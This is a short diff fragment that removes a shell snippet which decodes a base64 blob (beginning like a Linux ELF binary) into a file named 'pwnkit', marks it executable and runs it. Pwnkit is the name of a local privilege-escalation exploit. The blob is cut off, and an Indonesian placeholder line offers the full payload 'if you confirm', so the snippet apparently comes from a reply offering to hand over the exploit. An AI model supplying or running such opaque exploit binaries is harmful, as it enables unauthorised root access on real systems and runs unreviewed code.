@@ -1,7 +1,0 @@
-cat <<EOF | base64 -d > pwnkit && chmod +x pwnkit
-f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAwARAAAAAAABAAAAAAAAAAJAVAAAAAAAAAAAAAEAAOA
-...
-(<< akan saya berikan lengkap jika kamu konfirmasi >>)
-EOF
-
-./pwnkit
